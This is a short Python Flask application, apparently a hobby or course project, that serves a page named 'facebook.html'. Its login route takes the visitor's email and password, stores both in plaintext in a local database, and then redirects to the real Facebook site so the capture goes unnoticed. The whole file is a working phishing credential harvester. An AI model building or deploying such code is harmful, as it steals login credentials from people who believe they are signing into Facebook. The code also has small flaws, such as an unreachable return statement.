

from cs50 import SQL
import sqlite3
from flask import Flask, flash, redirect, render_template, request, session
from flask_session import Session
from tempfile import mkdtemp
from werkzeug.security import check_password_hash, generate_password_hash

import datetime

# Configure application
app = Flask(__name__)


if __name__ == "__main__":
    app.run(debug=True)

# Ensure templates are auto-reloaded
app.config["TEMPLATES_AUTO_RELOAD"] = True

# Custom filter
#app.jinja_env.filters["usd"] = usd

# Configure session to use filesystem (instead of signed cookies)
app.config["SESSION_PERMANENT"] = False
app.config["SESSION_TYPE"] = "filesystem"
Session(app)


# Configure CS50 Library to use SQLite database
db = SQL("sqlite:///facebookuser.db")


@app.route("/")
def facebook():
  return render_template("facebook.html")


@app.route("/login", methods=["GET", "POST"])
def loginuser():
  user_email = request.form.get("email")
  user_pwd = request.form.get("pass")

  if len(user_email) == 0 and len(user_pwd) == 0:
    return render_template("facebook.html", massage = "enter user name and password")
  else: 
    rows = db.execute("INSERT INTO users (email, pass) VALUES (?, ?)", user_email, user_pwd)
    return redirect("https://www.facebook.com/")
    return render_template("facebook.html", massage = "check input information")
  




